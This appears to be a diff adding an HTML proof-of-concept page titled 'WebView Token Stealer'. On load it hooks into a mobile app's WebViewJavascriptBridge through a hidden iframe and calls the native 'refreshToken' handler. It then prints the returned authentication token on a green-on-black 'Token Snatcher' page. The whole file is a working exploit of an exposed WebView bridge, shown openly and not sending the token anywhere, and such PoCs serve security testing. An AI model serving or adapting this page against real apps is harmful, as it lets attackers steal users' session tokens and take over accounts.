@@ -1,0 +1,46 @@
+<!DOCTYPE html>
+<html>
+<head>
+  <title>WebView Token Stealer</title>
+  <meta charset="UTF-8">
+  <script>
+    function onBridgeReady() {
+      document.getElementById("status").textContent = "[*] Bridge detected. Sending token request...";
+
+      try {
+        WebViewJavascriptBridge.callHandler("refreshToken", {}, function(response) {
+          document.getElementById("token").textContent = "[+] Token: " + response;
+        });
+      } catch (err) {
+        document.getElementById("token").textContent = "[!] Error: " + err;
+      }
+    }
+
+    function setupBridge(callback) {
+      if (window.WebViewJavascriptBridge) {
+        return callback(WebViewJavascriptBridge);
+      }
+      if (window.WVJBCallbacks) {
+        return window.WVJBCallbacks.push(callback);
+      }
+      window.WVJBCallbacks = [callback];
+      var WVJBIframe = document.createElement('iframe');
+      WVJBIframe.style.display = 'none';
+      WVJBIframe.src = 'yy://__BRIDGE_LOADED__';
+      document.documentElement.appendChild(WVJBIframe);
+      setTimeout(function() {
+        document.documentElement.removeChild(WVJBIframe);
+      }, 0);
+    }
+
+    window.onload = function() {
+      setupBridge(onBridgeReady);
+    };
+  </script>
+</head>
+<body style="background:#111; color:#0f0; font-family:monospace;">
+  <h1>WebView Token Snatcher</h1>
+  <pre id="status">[*] Waiting for WebViewJavascriptBridge...</pre>
+  <pre id="token"></pre>
+</body>
+</html>
